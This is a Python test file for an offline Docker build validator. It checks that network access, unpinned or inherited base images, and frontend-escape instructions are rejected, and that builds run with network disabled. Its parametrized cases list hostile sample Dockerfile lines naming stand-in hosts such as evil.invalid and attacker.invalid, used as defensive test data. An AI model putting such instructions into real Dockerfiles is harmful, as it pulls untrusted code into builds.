"""Network-free build profile is explicit, bounded and cannot fall back online."""

from unittest.mock import Mock

import pytest

from adapters.build.image import ImageBuilder
from adapters.build.offline import validate_offline_dockerfile
from application.deployment_core import analyze

BASES = {"python:3.13": "sha256:" + "a" * 64}


@pytest.mark.parametrize(
    "instruction",
    [
        "FROM attacker.invalid/base",
        "ARG BASE=python:3.13",
        "ADD https://evil.invalid/a /a",
        "ADD files.tar /app",
        "RUN --network=host curl localhost",
        "RUN\t--network=host curl localhost",
        "RUN --mount=type=ssh true",
        "COPY --from=unknown /app /app",
        "ONBUILD RUN true",
        "# syntax=evil.invalid/frontend",
        "# escape=`",
        "RUN <<EOF\nFROM evil AS x\nEOF",
    ],
)
def test_offline_profile_rejects_network_and_frontend_escape_instructions(instruction):
    command = Mock()
    with pytest.raises(ValueError):
        validate_offline_dockerfile("FROM python:3.13\n" + instruction, BASES, command)


def test_wrong_or_inherited_base_is_rejected():
    with pytest.raises(ValueError, match="identity"):
        validate_offline_dockerfile("FROM python:3.13", BASES, Mock(return_value="sha256:" + "b" * 64))
    with pytest.raises(ValueError, match="triggers"):
        validate_offline_dockerfile(
            "FROM python:3.13", BASES, Mock(side_effect=[BASES["python:3.13"], '{"OnBuild":["RUN true"]}'])
        )


def test_image_builder_applies_offline_flags_to_actual_build_command(tmp_path):
    (tmp_path / "Dockerfile").write_text('FROM python:3.13\nCOPY . /app\nCMD ["python","/app/server.py"]')
    (tmp_path / "server.py").write_text("print('hello')")
    plan = analyze(tmp_path)
    calls = []

    def command(args):
        calls.append(args)
        if args[:3] == ["docker", "image", "inspect"]:
            return "{}" if "{{json .Config}}" in args else BASES["python:3.13"]
        return ""

    ImageBuilder(command, Mock()).build(tmp_path, plan, "local:offline", offline_bases=BASES)
    invocation = next(args for args in calls if args[:2] == ["docker", "build"])
    assert invocation[invocation.index("--network") + 1] == "none"
    assert "--pull=false" in invocation


def test_multistage_uses_only_registered_base_and_local_stages():
    command = Mock(side_effect=[BASES["python:3.13"], "{}"])
    validate_offline_dockerfile(
        "FROM python:3.13 AS build\nRUN true\nFROM scratch\nCOPY --from=build /app /app", BASES, command
    )
    assert command.call_count == 2
